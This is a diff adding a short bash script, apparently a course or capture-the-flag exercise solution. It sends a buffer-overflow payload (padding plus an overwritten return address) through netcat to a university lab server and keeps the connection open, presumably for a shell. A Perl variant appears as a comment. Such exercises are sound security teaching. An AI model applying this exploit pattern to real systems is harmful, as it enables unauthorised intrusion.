@@ -1,0 +1,5 @@
+#!/bin/bash
+(python -c "print '1 2 3 4 5 6 ' + 'A'*16 + '\x30\x87\x04\x08\n'" && cat) | nc secprog.cs.nctu.edu.tw 10002
+
+# perl
+#(perl -e 'print "1 2 3 4 5 6 " . "A"x16 . "\x30\x87\x04\x08\n"' && cat) | nc secprog.cs.nctu.edu.tw 10002
